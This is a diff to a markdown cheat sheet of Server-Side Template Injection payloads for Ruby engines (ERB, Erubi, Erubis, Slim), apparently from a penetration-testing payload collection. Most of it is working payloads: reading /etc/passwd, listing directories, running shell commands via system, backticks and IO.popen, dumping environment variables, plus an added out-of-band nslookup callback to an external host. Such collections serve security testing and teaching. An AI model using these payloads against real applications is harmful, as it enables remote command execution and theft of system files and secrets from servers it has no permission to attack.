@@ -1,12 +1,30 @@
 # Server Side Template Injection - Ruby
 
+> Server-Side Template Injection (SSTI)  is a vulnerability that arises when an attacker can inject malicious code into a server-side template, causing the server to execute arbitrary commands. In Ruby, SSTI can occur when using templating engines like ERB (Embedded Ruby), Haml, liquid, or Slim, especially when user input is incorporated into templates without proper sanitization or validation.
+
+
 ## Summary
 
+- [Templating Libraries](#templating-libraries)
 - [Ruby](#ruby)
     - [Ruby - Basic injections](#ruby---basic-injections)
     - [Ruby - Retrieve /etc/passwd](#ruby---retrieve-etcpasswd)
     - [Ruby - List files and directories](#ruby---list-files-and-directories)
-    - [Ruby - Code execution](#ruby---code-execution)
+    - [Ruby - Remote Command execution](#ruby---remote-Command-execution)
+- [References](#references)
+
+
+## Templating Libraries
+
+| Template Name | Payload Format |
+| ------------ | --------- |
+| Erb      | `<%= %>`   |
+| Erubi    | `<%= %>`   |
+| Erubis   | `<%= %>`   |
+| HAML     | `#{ }`     |
+| Liquid   | `{{ }}`    |
+| Mustache | `{{ }}`    |
+| Slim     | `#{ }`     |
 
 
 ## Ruby
@@ -37,11 +55,12 @@
 <%= Dir.entries('/') %>
 ```
 
-### Ruby - Code execution
+### Ruby - Remote Command execution
 
-Execute code using SSTI for **ERB** engine.
+Execute code using SSTI for **Erb**,**Erubi**,**Erubis** engine.
 
 ```ruby
+<%=(`nslookup oastify.com`)%>
 <%= system('cat /etc/passwd') %>
 <%= `ls /` %>
 <%= IO.popen('ls /').readlines()  %>
@@ -55,4 +74,7 @@ Execute code using SSTI for **Slim** engine.
 #{ %x|env| }
 ```
 
----
+
+## References
+
+* [Ruby ERB Template Injection - Scott White & Geoff Walton - September 13, 2017](https://web.archive.org/web/20181119170413/https://www.trustedsec.com/2017/09/rubyerb-template-injection/)
